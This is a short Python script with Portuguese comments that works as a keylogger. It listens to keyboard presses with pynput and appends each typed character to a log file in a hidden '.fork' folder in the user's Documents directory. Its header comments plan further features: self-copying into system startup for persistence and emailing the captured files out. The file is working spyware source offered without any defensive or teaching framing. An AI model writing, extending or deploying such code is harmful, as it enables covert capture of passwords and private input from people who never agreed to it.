# indicar qual o programa aberto no computador https://pt.stackoverflow.com/questions/175447/como-obter-uma-lista-com-os-processos-em-execu%C3%A7%C3%A3o-do-windows-em-python
# https://www.devmedia.com.br/forum/como-verificar-informacoes-do-sistema-com-python/606803
# criar uma copia dele mesmo e exportar para inicializacao do sistema
# enviar arquivos por email

from pynput import keyboard
import os
from getpass import getuser


def pressionando(tecla):
    armazena2 = ''
    usuario = getuser()
    os.chdir(f'/home/{usuario}/Documentos/')
    try:
        try:
            print('subprocess ok')
            armazena = f'{tecla.char}'
            armazena2 = armazena + armazena2
            for palavras in armazena:
                if '.fork' in os.listdir(f'/home/{usuario}/Documentos/'):
                    with open(f'/home/{usuario}/Documentos/.fork/arquivo_key.log', 'a') as gravado:
                        escrever = gravado.writelines(palavras)
                        print(len(armazena2))
                else:
                    os.mkdir(f'/home/{usuario}/Documentos/.fork')
                    with open(f'/home/{usuario}/Documentos/.fork/arquivo_key.log', 'a') as gravado:
                        escrever = gravado.writelines(palavras)
        except AttributeError:
            pass
    except KeyboardInterrupt:
        pass


with keyboard.Listener(on_press=pressionando) as listener:
    listener.join()
